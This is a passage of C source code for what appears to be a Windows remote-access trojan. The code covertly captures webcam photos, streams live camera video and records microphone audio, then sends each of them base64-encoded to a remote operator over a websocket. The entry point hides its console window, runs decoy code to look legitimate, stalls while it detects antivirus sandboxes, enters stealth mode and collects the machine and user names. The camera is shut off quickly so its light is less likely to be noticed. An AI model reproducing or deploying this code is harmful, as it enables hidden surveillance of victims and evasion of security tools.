    send_websocket_data("\n[*] Available cameras:\n", 24);
    
    for (int i = 0; i < 10; i++) {
        if (capGetDriverDescriptionA(i, name, sizeof(name), version, sizeof(version))) {
            sprintf(msg, "  [%d] %s", i, name);
            if (version[0]) {
                strcat(msg, " (");
                strcat(msg, version);
                strcat(msg, ")");
            }
            if (i == g_current_camera) {
                strcat(msg, " <- SELECTED");
            }
            strcat(msg, "\n");
            send_websocket_data(msg, strlen(msg));
            found++;
        }
    }
    
    if (found == 0) {
        send_websocket_data("[!] No cameras found\n", 21);
    } else {
        g_num_cameras = found;
        sprintf(msg, "\n[*] Total: %d camera(s). Use 'selectcam <number>' to switch.\n", found);
        send_websocket_data(msg, strlen(msg));
    }
}

// Select a camera by index
void select_camera(int index) {
    char msg[256];
    
    // Verify camera exists
    char name[256], version[256];
    if (!capGetDriverDescriptionA(index, name, sizeof(name), version, sizeof(version))) {
        sprintf(msg, "[!] Camera %d not found. Use 'listcam' to see available cameras.\n", index);
        send_websocket_data(msg, strlen(msg));
        return;
    }
    
    // Close current camera if open
    if (g_cam_hwnd) {
        close_camera();
    }
    
    g_current_camera = index;
    sprintf(msg, "[+] Selected camera %d: %s\n", index, name);
    send_websocket_data(msg, strlen(msg));
}

// Frame callback - Metasploit style
LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVHdr) {
    if (!lpVHdr || !lpVHdr->lpData || lpVHdr->dwBytesUsed == 0) {
        return 0;
    }
    
    EnterCriticalSection(&g_frame_cs);
    
    // Allocate/reallocate buffer if needed
    if (!g_frame_buffer || g_frame_size < (int)lpVHdr->dwBytesUsed) {
        if (g_frame_buffer) free(g_frame_buffer);
        g_frame_buffer = (BYTE*)malloc(lpVHdr->dwBytesUsed);
    }
    
    if (g_frame_buffer) {
        memcpy(g_frame_buffer, lpVHdr->lpData, lpVHdr->dwBytesUsed);
        g_frame_size = lpVHdr->dwBytesUsed;
        g_frame_ready = 1;
    }
    
    LeaveCriticalSection(&g_frame_cs);
    return 1;
}

// Initialize camera capture window - Metasploit style
HWND init_camera(int camera_index) {
    if (g_cam_hwnd) {
        close_camera();
    }
    
    // Initialize critical section
    if (!g_frame_cs_init) {
        InitializeCriticalSection(&g_frame_cs);
        g_frame_cs_init = 1;
    }
    
    g_frame_ready = 0;
    
    // Create popup window (hidden but functional)
    g_cam_hwnd = capCreateCaptureWindowA(
        "cap",
        WS_POPUP,
        0, 0, 320, 240,
        NULL, 0
    );
    
    if (!g_cam_hwnd) {
        return NULL;
    }
    
    // Connect to camera driver
    if (!capDriverConnect(g_cam_hwnd, camera_index)) {
        DestroyWindow(g_cam_hwnd);
        g_cam_hwnd = NULL;
        return NULL;
    }
    
    // Get video format
    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    capGetVideoFormat(g_cam_hwnd, &bmi, sizeof(bmi));
    
    // Try to set RGB24 format (avoid MJPG which needs decoding)
    bmi.bmiHeader.biCompression = BI_RGB;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biSizeImage = 0;
    capSetVideoFormat(g_cam_hwnd, &bmi, sizeof(bmi));
    
    // Re-read format (camera may not support RGB24)
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    capGetVideoFormat(g_cam_hwnd, &bmi, sizeof(bmi));
    
    g_cam_width = bmi.bmiHeader.biWidth;
    g_cam_height = abs(bmi.bmiHeader.biHeight);
    
    if (g_cam_width <= 0) g_cam_width = 640;
    if (g_cam_height <= 0) g_cam_height = 480;
    
    // Set up frame callback - THIS IS THE KEY (like Metasploit)
    capSetCallbackOnFrame(g_cam_hwnd, FrameCallback);
    
    return g_cam_hwnd;
}

// Close camera
void close_camera() {
    if (g_cam_hwnd) {
        capSetCallbackOnFrame(g_cam_hwnd, NULL);
        capPreview(g_cam_hwnd, FALSE);
        capDriverDisconnect(g_cam_hwnd);
        DestroyWindow(g_cam_hwnd);
        g_cam_hwnd = NULL;
        g_cam_width = 640;
        g_cam_height = 480;
    }
}

// Capture frame using callback method (like Metasploit)
int capture_camera_frame(BYTE** out_data, int* out_width, int* out_height) {
    char msg[256];
    MSG winMsg;
    
    // Initialize camera if needed
    if (!g_cam_hwnd) {
        if (!init_camera(g_current_camera)) {
            send_websocket_data("[!] Cannot open camera\n", 23);
            return 0;
        }
    }
    
    sprintf(msg, "[*] Camera opened: %dx%d\n", g_cam_width, g_cam_height);
    send_websocket_data(msg, strlen(msg));
    
    // Reset frame ready flag
    g_frame_ready = 0;
    
    // Start preview to activate camera
    capPreviewRate(g_cam_hwnd, 66);
    capPreview(g_cam_hwnd, TRUE);
    
    send_websocket_data("[*] Waiting for camera warmup...\n", 33);
    Sleep(1500);  // Camera warmup
    
    // Grab frames and pump messages - THIS TRIGGERS THE CALLBACK
    send_websocket_data("[*] Grabbing frames...\n", 23);
    
    int attempts = 0;
    while (!g_frame_ready && attempts < 30) {
        // Grab a frame (triggers FrameCallback)
        capGrabFrame(g_cam_hwnd);
        
        // Process Windows messages (required for callback)
        while (PeekMessage(&winMsg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&winMsg);
            DispatchMessage(&winMsg);
        }
        
        Sleep(100);
        attempts++;
    }
    
    capPreview(g_cam_hwnd, FALSE);
    
    if (!g_frame_ready || !g_frame_buffer || g_frame_size == 0) {
        sprintf(msg, "[!] No frame captured after %d attempts\n", attempts);
        send_websocket_data(msg, strlen(msg));
        return 0;
    }
    
    sprintf(msg, "[*] Frame captured! Size: %d bytes\n", g_frame_size);
    send_websocket_data(msg, strlen(msg));
    
    // Get video format for color conversion
    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    capGetVideoFormat(g_cam_hwnd, &bmi, sizeof(bmi));
    
    int width = bmi.bmiHeader.biWidth;
    int height = abs(bmi.bmiHeader.biHeight);
    int bpp = bmi.bmiHeader.biBitCount;
    DWORD compression = bmi.bmiHeader.biCompression;
    
    sprintf(msg, "[*] Format: %dx%d, %d bpp, comp=0x%lX\n", width, height, bpp, compression);
    send_websocket_data(msg, strlen(msg));
    
    if (width <= 0 || height <= 0) {
        width = g_cam_width;
        height = g_cam_height;
    }
    
    EnterCriticalSection(&g_frame_cs);
    
    // Check for MJPG format (0x47504A4D = 'GPJM' = MJPG in little-endian)
    // MJPG is already JPEG compressed - send directly!
    if (compression == 0x47504A4D || compression == 0x4D4A5047) {
        send_websocket_data("[*] MJPG format - sending JPEG directly\n", 40);
        
        // The frame buffer IS a JPEG image already
        BYTE* jpeg_data = (BYTE*)malloc(g_frame_size);
        if (jpeg_data) {
            memcpy(jpeg_data, g_frame_buffer, g_frame_size);
            LeaveCriticalSection(&g_frame_cs);
            
            // Return JPEG data with special marker
            *out_data = jpeg_data;
            *out_width = width;
            *out_height = height;
            return 2;  // Return 2 to indicate JPEG format
        }
        LeaveCriticalSection(&g_frame_cs);
        return 0;
    }
    
    // For non-MJPG formats, convert to RGB24
    int dst_stride = ((width * 3 + 3) & ~3);
    DWORD dst_size = dst_stride * height;
    BYTE* pixels = (BYTE*)malloc(dst_size);
    
    if (!pixels) {
        LeaveCriticalSection(&g_frame_cs);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return 0;
    }
    
    BYTE* src = g_frame_buffer;
    int src_stride;
    
    // Handle YUY2/YUYV format (most common for webcams)
    if (compression == 0x32595559 || compression == 0x59555932) {  // YUY2
        src_stride = width * 2;
        for (int y = 0; y < height; y++) {
            BYTE* src_row = src + (height - 1 - y) * src_stride;
            BYTE* dst_row = pixels + y * dst_stride;
            for (int x = 0; x < width; x += 2) {
                int Y0 = src_row[x*2 + 0];
                int U  = src_row[x*2 + 1] - 128;
                int Y1 = src_row[x*2 + 2];
                int V  = src_row[x*2 + 3] - 128;
                
                int R0 = Y0 + ((359 * V) >> 8);
                int G0 = Y0 - ((88 * U + 183 * V) >> 8);
                int B0 = Y0 + ((454 * U) >> 8);
                
                int R1 = Y1 + ((359 * V) >> 8);
                int G1 = Y1 - ((88 * U + 183 * V) >> 8);
                int B1 = Y1 + ((454 * U) >> 8);
                
                dst_row[x*3+0] = (R0 < 0) ? 0 : (R0 > 255) ? 255 : R0;
                dst_row[x*3+1] = (G0 < 0) ? 0 : (G0 > 255) ? 255 : G0;
                dst_row[x*3+2] = (B0 < 0) ? 0 : (B0 > 255) ? 255 : B0;
                
                dst_row[(x+1)*3+0] = (R1 < 0) ? 0 : (R1 > 255) ? 255 : R1;
                dst_row[(x+1)*3+1] = (G1 < 0) ? 0 : (G1 > 255) ? 255 : G1;
                dst_row[(x+1)*3+2] = (B1 < 0) ? 0 : (B1 > 255) ? 255 : B1;
            }
        }
    } else if (bpp == 24) {  // RGB24
        src_stride = ((width * 3 + 3) & ~3);
        for (int y = 0; y < height; y++) {
            BYTE* src_row = src + (height - 1 - y) * src_stride;
            BYTE* dst_row = pixels + y * dst_stride;
            for (int x = 0; x < width; x++) {
                dst_row[x*3+0] = src_row[x*3+2];  // R
                dst_row[x*3+1] = src_row[x*3+1];  // G
                dst_row[x*3+2] = src_row[x*3+0];  // B
            }
        }
    } else if (bpp == 32) {  // RGB32
        src_stride = width * 4;
        for (int y = 0; y < height; y++) {
            BYTE* src_row = src + (height - 1 - y) * src_stride;
            BYTE* dst_row = pixels + y * dst_stride;
            for (int x = 0; x < width; x++) {
                dst_row[x*3+0] = src_row[x*4+2];
                dst_row[x*3+1] = src_row[x*4+1];
                dst_row[x*3+2] = src_row[x*4+0];
            }
        }
    } else {
        // Unknown format - copy raw data as grayscale
        send_websocket_data("[*] Unknown format, using raw\n", 30);
        memset(pixels, 128, dst_size);
    }
    
    LeaveCriticalSection(&g_frame_cs);
    
    *out_data = pixels;
    *out_width = width;
    *out_height = height;
    
    send_websocket_data("[*] Frame converted successfully\n", 33);
    return 1;
}

// Take a single webcam photo
void take_camshot() {
    send_websocket_data("[*] Capturing webcam photo...\n", 30);
    
    // Close any existing camera first
    if (g_cam_hwnd) {
        close_camera();
        Sleep(200);
    }
    
    // Initialize camera
    if (!init_camera(g_current_camera)) {
        send_websocket_data("[!] Failed to open camera. No camera found or in use.\n", 54);
        return;
    }
    
    // Give camera time to initialize and adjust exposure
    Sleep(500);
    
    BYTE* pixels = NULL;
    int width, height;
    
    // Try to capture frame (returns 1=RGB, 2=JPEG, 0=failed)
    int result = capture_camera_frame(&pixels, &width, &height);
    if (result == 0) {
        send_websocket_data("[!] Failed to capture frame from webcam.\n", 41);
        close_camera();
        return;
    }
    
    // Close camera IMMEDIATELY after capture to turn off light
    close_camera();
    
    DWORD size;
    int is_jpeg = (result == 2);
    
    if (is_jpeg) {
        // For JPEG, g_frame_size has the actual size
        size = g_frame_size;
    } else {
        // For RGB, calculate size from dimensions
        int stride = ((width * 3 + 3) & ~3);
        size = stride * height;
    }
    
    char size_msg[128];
    sprintf(size_msg, "[*] Webcam resolution: %dx%d (%s)\n", width, height, is_jpeg ? "JPEG" : "RGB");
    send_websocket_data(size_msg, strlen(size_msg));
    
    // Base64 encode for transfer
    DWORD b64_size = ((size + 2) / 3) * 4 + 1;
    char* b64_data = (char*)malloc(b64_size);
    
    if (!b64_data) {
        free(pixels);
        send_websocket_data("[!] Memory error\n", 17);
        return;
    }
    
    base64_encode(pixels, size, b64_data);
    free(pixels);
    
    DWORD b64_len = strlen(b64_data);
    
    // Send header - include format info
    char header[256];
    if (is_jpeg) {
        sprintf(header, "<<<CAMSHOT_JPEG>>>%d|%d|%lu<<<DATA_START>>>", width, height, size);
    } else {
        sprintf(header, "<<<CAMSHOT_START>>>%d|%d|%lu<<<DATA_START>>>", width, height, size);
    }
    if (!send_websocket_data(header, strlen(header))) {
        free(b64_data);
        return;
    }
    
    Sleep(100);
    
    // Send base64 data in chunks
    DWORD sent = 0;
    DWORD chunk_size = 1024;
    int error = 0;
    
    while (sent < b64_len && !error && g_connected) {
        DWORD to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        if (!send_websocket_data(b64_data + sent, to_send)) {
            error = 1;
            break;
        }
        sent += to_send;
        
        if ((sent % 16384) < chunk_size) {
            Sleep(30);
            send_websocket_ping();
        }
    }
    
    free(b64_data);
    
    if (!error && g_connected) {
        Sleep(150);
        send_websocket_data("<<<CAMSHOT_END>>>", 17);
        Sleep(50);
        
        char msg[128];
        sprintf(msg, "\n[+] Webcam photo captured: %dx%d\n", width, height);
        send_websocket_data(msg, strlen(msg));
    } else {
        send_websocket_data("\n[!] Webcam capture transfer failed\n", 37);
    }
}

// Camera live view thread - uses callback capture (like Metasploit)
DWORD WINAPI camview_thread(LPVOID param) {
    int frame_interval = 1000 / g_camview_fps;
    int frame_count = 0;
    int consecutive_errors = 0;
    MSG winMsg;
    
    // Close any existing camera
    if (g_cam_hwnd) {
        close_camera();
        Sleep(100);
    }
    
    // Initialize camera
    if (!init_camera(g_current_camera)) {
        send_websocket_data("[!] Failed to initialize camera\n", 32);
        g_camview_running = 0;
        return 0;
    }
    
    char start_msg[128];
    sprintf(start_msg, "[+] Camera streaming: %dx%d @ %d FPS\n", g_cam_width, g_cam_height, g_camview_fps);
    send_websocket_data(start_msg, strlen(start_msg));
    
    // Get video format
    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    capGetVideoFormat(g_cam_hwnd, &bmi, sizeof(bmi));
    int width = bmi.bmiHeader.biWidth;
    int height = abs(bmi.bmiHeader.biHeight);
    int bpp = bmi.bmiHeader.biBitCount;
    DWORD compression = bmi.bmiHeader.biCompression;
    
    // Start preview for warmup
    capPreviewRate(g_cam_hwnd, 66);
    capPreview(g_cam_hwnd, TRUE);
    Sleep(1500);  // Initial warmup
    
    while (g_camview_running && g_connected) {
        DWORD start_time = GetTickCount();
        
        if (!g_connected) break;
        
        // Reset frame ready and grab frame
        g_frame_ready = 0;
        capGrabFrame(g_cam_hwnd);
        
        // Process messages to trigger callback
        while (PeekMessage(&winMsg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&winMsg);
            DispatchMessage(&winMsg);
        }
        
        // Wait briefly for callback
        for (int wait = 0; wait < 5 && !g_frame_ready; wait++) {
            Sleep(10);
            while (PeekMessage(&winMsg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&winMsg);
                DispatchMessage(&winMsg);
            }
        }
        
        if (g_frame_ready && g_frame_buffer && g_frame_size > 0) {
            EnterCriticalSection(&g_frame_cs);
            
            // Copy frame data while holding lock
            int frame_size = g_frame_size;
            BYTE* frame_copy = (BYTE*)malloc(frame_size);
            
            if (frame_copy) {
                memcpy(frame_copy, g_frame_buffer, frame_size);
                LeaveCriticalSection(&g_frame_cs);
                
                // Check for MJPG format - send JPEG directly
                if (compression == 0x47504A4D || compression == 0x4D4A5047) {
                    // MJPG - frame is already JPEG compressed, send directly
                    DWORD b64_size = ((frame_size + 2) / 3) * 4 + 1;
                    char* b64_data = (char*)malloc(b64_size);
                    
                    if (b64_data && g_connected) {
                        base64_encode(frame_copy, frame_size, b64_data);
                        DWORD b64_len = strlen(b64_data);
                        
                        char header[256];
                        // Use special JPEG frame marker
                        sprintf(header, "<<<CAMVIEW_JPEG>>>%d|%d|%d<<<FRAME_DATA>>>", width, height, frame_size);
                        
                        if (send_websocket_data(header, strlen(header))) {
                            DWORD sent = 0;
                            while (sent < b64_len && g_camview_running && g_connected) {
                                int to_send = (b64_len - sent < 8192) ? (b64_len - sent) : 8192;
                                if (!send_websocket_data(b64_data + sent, to_send)) break;
                                sent += to_send;
                            }
                            if (g_connected) send_websocket_data("<<<FRAME_END>>>", 15);
                        }
                        free(b64_data);
                    }
                    free(frame_copy);
                    consecutive_errors = 0;
                    frame_count++;
                } else {
                    // Raw format - convert to RGB
                    // Scale down for streaming
                    int out_width = width;
                    int out_height = height;
                    int scale = 1;
                    while (out_width > 320 || out_height > 240) {
                        scale *= 2;
                        out_width = width / scale;
                        out_height = height / scale;
                    }
                    
                    int out_stride = ((out_width * 3 + 3) & ~3);
                    DWORD out_size = out_stride * out_height;
                    BYTE* pixels = (BYTE*)malloc(out_size);
                    
                    if (pixels) {
                    BYTE* src = frame_copy;
                    
                    // Handle YUY2 format
                    if (compression == 0x32595559 || compression == 0x59555932) {
                        int src_stride = width * 2;
                        for (int y = 0; y < out_height; y++) {
                            int src_y = height - 1 - (y * scale);
                            if (src_y < 0) src_y = 0;
                            BYTE* src_row = src + src_y * src_stride;
                            BYTE* dst_row = pixels + y * out_stride;
                            
                            for (int x = 0; x < out_width; x++) {
                                int sx = x * scale;
                                int idx = (sx / 2) * 4;
                                int Y = (sx % 2 == 0) ? src_row[idx] : src_row[idx + 2];
                                int U = src_row[idx + 1] - 128;
                                int V = src_row[idx + 3] - 128;
                                
                                int R = Y + ((359 * V) >> 8);
                                int G = Y - ((88 * U + 183 * V) >> 8);
                                int B = Y + ((454 * U) >> 8);
                                
                                dst_row[x*3+0] = (R < 0) ? 0 : (R > 255) ? 255 : R;
                                dst_row[x*3+1] = (G < 0) ? 0 : (G > 255) ? 255 : G;
                                dst_row[x*3+2] = (B < 0) ? 0 : (B > 255) ? 255 : B;
                            }
                        }
                    } else if (bpp == 24) {
                        int src_stride = ((width * 3 + 3) & ~3);
                        for (int y = 0; y < out_height; y++) {
                            int src_y = height - 1 - (y * scale);
                            if (src_y < 0) src_y = 0;
                            BYTE* src_row = src + src_y * src_stride;
                            BYTE* dst_row = pixels + y * out_stride;
                            for (int x = 0; x < out_width; x++) {
                                int sx = x * scale;
                                dst_row[x*3+0] = src_row[sx*3+2];
                                dst_row[x*3+1] = src_row[sx*3+1];
                                dst_row[x*3+2] = src_row[sx*3+0];
                            }
                        }
                    } else if (bpp == 32) {
                        int src_stride = width * 4;
                        for (int y = 0; y < out_height; y++) {
                            int src_y = height - 1 - (y * scale);
                            if (src_y < 0) src_y = 0;
                            BYTE* src_row = src + src_y * src_stride;
                            BYTE* dst_row = pixels + y * out_stride;
                            for (int x = 0; x < out_width; x++) {
                                int sx = x * scale;
                                dst_row[x*3+0] = src_row[sx*4+2];
                                dst_row[x*3+1] = src_row[sx*4+1];
                                dst_row[x*3+2] = src_row[sx*4+0];
                            }
                        }
                    } else {
                        memset(pixels, 128, out_size);
                    }
                    
                    // Send frame
                    DWORD b64_size = ((out_size + 2) / 3) * 4 + 1;
                    char* b64_data = (char*)malloc(b64_size);
                    
                    if (b64_data && g_connected) {
                        base64_encode(pixels, out_size, b64_data);
                        DWORD b64_len = strlen(b64_data);
                        
                        char header[256];
                        sprintf(header, "<<<CAMVIEW_FRAME>>>%d|%d|%lu<<<FRAME_DATA>>>", out_width, out_height, out_size);
                        
                        if (send_websocket_data(header, strlen(header))) {
                            DWORD sent = 0;
                            while (sent < b64_len && g_camview_running && g_connected) {
                                int to_send = (b64_len - sent < 8192) ? (b64_len - sent) : 8192;
                                if (!send_websocket_data(b64_data + sent, to_send)) break;
                                sent += to_send;
                            }
                            if (g_connected) send_websocket_data("<<<FRAME_END>>>", 15);
                        }
                        free(b64_data);
                    }
                    free(pixels);
                    consecutive_errors = 0;
                    frame_count++;
                    }  // end if(pixels)
                    free(frame_copy);
                }  // end else (raw format)
            } else {
                LeaveCriticalSection(&g_frame_cs);
            }
        } else {
            consecutive_errors++;
            // Don't exit on errors - just keep trying
            if (consecutive_errors > 300) {
                send_websocket_data("[!] Camera stream lost\n", 23);
                break;
            }
        }
        
        // Maintain frame rate
        if (g_camview_running && g_connected) {
            DWORD elapsed = GetTickCount() - start_time;
            if (elapsed < (DWORD)frame_interval) {
                Sleep(frame_interval - elapsed);
            }
        }
    }
    
    capPreview(g_cam_hwnd, FALSE);
    close_camera();
    g_camview_running = 0;
    
    // Only notify if still connected
    if (g_connected) {
        send_websocket_data("<<<CAMVIEW_STOPPED>>>\n", 22);
    }
    
    return 0;
}

void start_camview(int fps, int quality) {
    if (g_camview_running) {
        send_websocket_data("[!] Camera view already running. Use 'stopcam' first.\n", 54);
        return;
    }
    
    // Clamp values
    if (fps < 1) fps = 1;
    if (fps > 60) fps = 60;
    if (quality < 10) quality = 10;
    if (quality > 100) quality = 100;
    
    // Close any existing camera
    if (g_cam_hwnd) {
        close_camera();
        Sleep(100);
    }
    
    g_camview_fps = fps;
    g_camview_quality = quality;
    g_camview_running = 1;
    
    // Optimize TCP for streaming
    int flag = 1;
    setsockopt(g_sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(flag));
    
    char msg[256];
    sprintf(msg, "<<<CAMVIEW_START>>>%d|%d\n", fps, quality);
    send_websocket_data(msg, strlen(msg));
    
    sprintf(msg, "[+] Starting camera view: %d FPS, %d%% quality (smooth mode)\n", fps, quality);
    send_websocket_data(msg, strlen(msg));
    
    g_camview_thread = CreateThread(NULL, 0, camview_thread, NULL, 0, NULL);
    if (g_camview_thread) {
        SetThreadPriority(g_camview_thread, THREAD_PRIORITY_ABOVE_NORMAL);
    }
}

void stop_camview() {
    if (!g_camview_running) {
        send_websocket_data("[!] Camera view not running\n", 28);
        return;
    }
    
    // Signal thread to stop
    g_camview_running = 0;
    
    // Wait for thread to finish
    if (g_camview_thread) {
        WaitForSingleObject(g_camview_thread, 5000);
        CloseHandle(g_camview_thread);
        g_camview_thread = NULL;
    }
    
    // Make sure camera is closed
    close_camera();
    
    // Reset frame state (static buffer - don't free)
    g_frame_ready = 0;
    g_frame_size = 0;
    
    send_websocket_data("[+] Camera view stopped\n", 24);
}

// ============== AUDIO RECORDING ==============

// WAV file header structure
typedef struct {
    char riff[4];           // "RIFF"
    DWORD file_size;        // File size - 8
    char wave[4];           // "WAVE"
    char fmt[4];            // "fmt "
    DWORD fmt_size;         // 16 for PCM
    WORD audio_format;      // 1 for PCM
    WORD num_channels;      // 1 = mono, 2 = stereo
    DWORD sample_rate;      // 44100, 22050, etc.
    DWORD byte_rate;        // sample_rate * num_channels * bits_per_sample/8
    WORD block_align;       // num_channels * bits_per_sample/8
    WORD bits_per_sample;   // 8, 16, etc.
    char data[4];           // "data"
    DWORD data_size;        // Size of audio data
} WAV_HEADER;

void record_audio(int seconds) {
    if (g_audio_recording) {
        send_websocket_data("[!] Audio recording already in progress\n", 40);
        return;
    }
    
    char msg[256];
    sprintf(msg, "[*] Recording audio for %d seconds...\n", seconds);
    send_websocket_data(msg, strlen(msg));
    
    g_audio_recording = 1;
    
    // Audio format settings
    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;              // Mono
    wfx.nSamplesPerSec = 22050;     // 22.05 kHz (good balance of quality/size)
    wfx.wBitsPerSample = 16;        // 16-bit
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;
    
    // Open audio input device
    HWAVEIN hWaveIn = NULL;
    MMRESULT result = waveInOpen(&hWaveIn, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    if (result != MMSYSERR_NOERROR) {
        send_websocket_data("[!] Failed to open audio device. No microphone?\n", 48);
        g_audio_recording = 0;
        return;
    }
    
    // Calculate buffer size for recording
    DWORD buffer_size = wfx.nAvgBytesPerSec * seconds;
    BYTE* audio_buffer = (BYTE*)malloc(buffer_size);
    
    if (!audio_buffer) {
        waveInClose(hWaveIn);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        g_audio_recording = 0;
        return;
    }
    
    // Prepare wave header
    WAVEHDR waveHdr;
    ZeroMemory(&waveHdr, sizeof(WAVEHDR));
    waveHdr.lpData = (LPSTR)audio_buffer;
    waveHdr.dwBufferLength = buffer_size;
    waveHdr.dwFlags = 0;
    
    result = waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    if (result != MMSYSERR_NOERROR) {
        free(audio_buffer);
        waveInClose(hWaveIn);
        send_websocket_data("[!] Failed to prepare audio buffer\n", 35);
        g_audio_recording = 0;
        return;
    }
    
    // Add buffer to input queue
    result = waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    if (result != MMSYSERR_NOERROR) {
        waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
        free(audio_buffer);
        waveInClose(hWaveIn);
        send_websocket_data("[!] Failed to add audio buffer\n", 31);
        g_audio_recording = 0;
        return;
    }
    
    // Start recording
    result = waveInStart(hWaveIn);
    if (result != MMSYSERR_NOERROR) {
        waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
        free(audio_buffer);
        waveInClose(hWaveIn);
        send_websocket_data("[!] Failed to start recording\n", 30);
        g_audio_recording = 0;
        return;
    }
    
    send_websocket_data("[*] Recording...\n", 17);
    
    // Wait for recording to complete
    DWORD start_time = GetTickCount();
    while ((waveHdr.dwFlags & WHDR_DONE) == 0) {
        Sleep(100);
        
        // Check if we should abort
        if (!g_connected) {
            waveInReset(hWaveIn);
            break;
        }
        
        // Timeout check (add 2 seconds buffer)
        if (GetTickCount() - start_time > (DWORD)((seconds + 2) * 1000)) {
            waveInReset(hWaveIn);
            break;
        }
    }
    
    // Stop recording
    waveInStop(hWaveIn);
    waveInReset(hWaveIn);
    
    // Get actual recorded bytes
    DWORD recorded_bytes = waveHdr.dwBytesRecorded;
    
    sprintf(msg, "[*] Recorded %lu bytes of audio\n", recorded_bytes);
    send_websocket_data(msg, strlen(msg));
    
    // Create WAV file in memory
    DWORD wav_size = sizeof(WAV_HEADER) + recorded_bytes;
    BYTE* wav_data = (BYTE*)malloc(wav_size);
    
    if (!wav_data) {
        waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
        free(audio_buffer);
        waveInClose(hWaveIn);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        g_audio_recording = 0;
        return;
    }
    
    // Fill WAV header
    WAV_HEADER* wav_header = (WAV_HEADER*)wav_data;
    memcpy(wav_header->riff, "RIFF", 4);
    wav_header->file_size = wav_size - 8;
    memcpy(wav_header->wave, "WAVE", 4);
    memcpy(wav_header->fmt, "fmt ", 4);
    wav_header->fmt_size = 16;
    wav_header->audio_format = 1;  // PCM
    wav_header->num_channels = wfx.nChannels;
    wav_header->sample_rate = wfx.nSamplesPerSec;
    wav_header->byte_rate = wfx.nAvgBytesPerSec;
    wav_header->block_align = wfx.nBlockAlign;
    wav_header->bits_per_sample = wfx.wBitsPerSample;
    memcpy(wav_header->data, "data", 4);
    wav_header->data_size = recorded_bytes;
    
    // Copy audio data after header
    memcpy(wav_data + sizeof(WAV_HEADER), audio_buffer, recorded_bytes);
    
    // Cleanup recording resources
    waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    free(audio_buffer);
    waveInClose(hWaveIn);
    
    // Base64 encode for transfer
    DWORD b64_size = ((wav_size + 2) / 3) * 4 + 1;
    char* b64_data = (char*)malloc(b64_size);
    
    if (!b64_data) {
        free(wav_data);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        g_audio_recording = 0;
        return;
    }
    
    base64_encode(wav_data, wav_size, b64_data);
    free(wav_data);
    
    DWORD b64_len = strlen(b64_data);
    
    // Send header
    char header[256];
    sprintf(header, "<<<AUDIO_START>>>%d|%lu<<<DATA_START>>>", seconds, wav_size);
    if (!send_websocket_data(header, strlen(header))) {
        free(b64_data);
        g_audio_recording = 0;
        return;
    }
    
    Sleep(100);
    
    // Send base64 data in chunks
    DWORD sent = 0;
    DWORD chunk_size = 1024;
    int error = 0;
    
    while (sent < b64_len && !error && g_connected) {
        DWORD to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        if (!send_websocket_data(b64_data + sent, to_send)) {
            error = 1;
            break;
        }
        sent += to_send;
        
        if ((sent % 16384) < chunk_size) {
            Sleep(30);
            send_websocket_ping();
        }
    }
    
    free(b64_data);
    
    if (!error && g_connected) {
        Sleep(150);
        send_websocket_data("<<<AUDIO_END>>>", 15);
        Sleep(50);
        
        sprintf(msg, "\n[+] Audio recording complete (%d seconds, %lu bytes)\n", seconds, wav_size);
        send_websocket_data(msg, strlen(msg));
    } else {
        send_websocket_data("\n[!] Audio transfer failed\n", 27);
    }
    
    g_audio_recording = 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // CRITICAL: Detach from any console FIRST to prevent CMD flash
    // This must happen before ANY other code
    FreeConsole();
    
    // Double-check: Hide any lingering console window
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
    
    // Seed random number generator
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    
    // Run decoy initialization (makes binary look legitimate)
    run_decoy_init();
    
    // Perform AV evasion checks - delay if sandbox detected
    while (perform_evasion_checks()) {
        Sleep(10000 + (rand() % 5000));
    }
    
    stealth_mode();
    
    // Load any persisted screen recording state from previous sessions
    load_screenrecord_state();
    
    // Auto-start screen recording if it was enabled in previous session
    if (g_screenrecord_enabled && !g_screenrecord_running) {
        start_screenrecord_internal();  // Silent start
    }
    
    // Start power monitor thread to resume recording after sleep/wake
    g_power_monitor_running = 1;
    g_power_monitor_thread = CreateThread(NULL, 0, power_monitor_thread, NULL, 0, NULL);
    
    // NOTE: Persistence is now manual - use 'persist' command
    // Don't auto-add to startup as it can trigger security prompts
    
    DWORD size = sizeof(g_computer_name);
    GetComputerNameA(g_computer_name, &size);
    
    size = sizeof(g_username);
    GetUserNameA(g_username, &size);
    
